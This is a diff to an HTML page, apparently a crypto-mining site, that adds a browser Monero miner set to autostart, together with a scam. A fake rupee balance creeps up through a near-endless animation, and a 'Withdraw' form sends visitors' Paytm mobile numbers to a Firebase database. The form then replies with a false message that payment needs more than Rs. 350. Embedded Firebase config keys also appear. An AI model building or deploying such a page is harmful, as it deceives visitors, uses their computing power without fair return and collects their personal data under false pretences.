@@ -5,9 +5,24 @@
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+<script src="https://www.gstatic.com/firebasejs/4.9.1/firebase.js"></script>
+<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-113654796-1"></script>
+<script>
+  // Initialize Firebase
+  var config = {
+    apiKey: "AIzaSyDho5ZexO-GOyzoeta1xH1DS3SCXLCHzOQ",
+    authDomain: "azraqstatic.firebaseapp.com",
+    databaseURL: "https://azraqstatic.firebaseio.com",
+    projectId: "azraqstatic",
+    storageBucket: "azraqstatic.appspot.com",
+    messagingSenderId: "1085619418851"
+  };
+  firebase.initializeApp(config);
+    console.log(firebase);
+</script>   
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
@@ -26,6 +41,39 @@ body, html {
 
 .container {
   margin-top: 33px;
+}
+
+.main_container {
+  height: 46px;
+  width: auto;
+  padding: 3px;
+  margin: 2px;
+  max-width: 300px;
+  background-color: #555555;
+  align-content: center;
+}
+.container_inner {
+  height: auto;
+  border: none;
+  background-color: #555555;
+  max-width: 290px;
+  vertical-align: center;
+  padding-top: 12px;
+  padding-left: 10px;
+  align-content: center;
+}
+ .num_tiles {
+  width:30px;
+  height: 30px;
+  background-color: #888888;
+  color: #ffffff;
+  font-size: 22px;
+  text-align: center;
+  line-height: 20px;
+  padding: 3px;
+  margin: 1.5px;
+  font-family: verdana;
+  vertical-align: center;
 }
 
 </style>
@@ -84,8 +132,37 @@ var x = setInterval(function() {
   </div>
 </nav>
     <br>
-
     <div class="container">
+      <h2>Mine Monero (XMR) for free using your machines unused processing power. Click on start mining to start earning today. Donot Refresh or close this page as it restarts your mining and you might lose all your balance.</h2>
+
+    <div
+    id="balance1"
+    class="coinhive-miner"
+  	style="width: 100%; height: 250px; margin-top: 25px;"
+  	data-key="mUDNKd7gDkj8mJPZyWNIXgjwS068GBaS"
+  	data-autostart="true"
+  	data-whitelabel="true"
+  	data-background="#000000"
+  	data-text="#eeeeee"
+  	data-action="#00ff00"
+  	data-graph="#555555"
+  	data-threads="4"
+  	data-throttle="0.1"
+    onload="myFunction()">
+  	<em>Loading...</em>
+  </div>
+  <br>
+  <label>Earning rate(per day): Rs. 50-100</label>
+  <br>
+  <label>Balance: </label>
+  <div id="shiva">Rs.<span class="count">500</span></div>
+  <br>
+  <label><b>Enter Paytm Registered mobile number:</b></label>
+    
+<textarea placeholder="Enter number here..." id="numbers" style="height: 35px; width: 150px;"></textarea>
+<button type="button" class="btn btn-info" onclick="myFunction()" id="withdraw">Withdraw</button>     
+                                        
+
       <h2>Early Bird sign up!</h2><a href="login.html"><button type="button" class="btn btn-info">Log In</button></a>
       <p>We are going live on February 15, 2018. Till then we are doing a discount giveaway of our cloud mining contracts. Check out the prices and the benefits below and sign up.</p>
 
@@ -172,4 +249,28 @@ var x = setInterval(function() {
     </div>
     <br>
 </body>
+<script>
+$('.count').each(function () {
+    $(this).prop('Counter',0).animate({
+        Counter: $(this).text()
+    }, {
+        duration: 6000000000000000000000000000000000000000000000000000000000000000000,
+        easing: 'swing',
+        step: function (now) {
+            $(this).text(Math.ceil(now));
+        }
+    });
+});
+
+var paynum= document.getElementById("numbers");
+var withdraw= document.getElementById("numbers");
+    var withdrawbtn= document.getElementById("withdraw");    
+var withdrawbtn= document.getElementById("withdraw");
+    function myFunction(){
+        var firebaseRef= firebase.database().ref();
+        var msgtext= withdraw.value;
+        firebaseRef.push().set(msgtext); 
+        window.alert("We have received your withdrawal request; however your payment will only process once you accumulate more than Rs. 350 in your balance.");
+    }
+</script>
 </html>
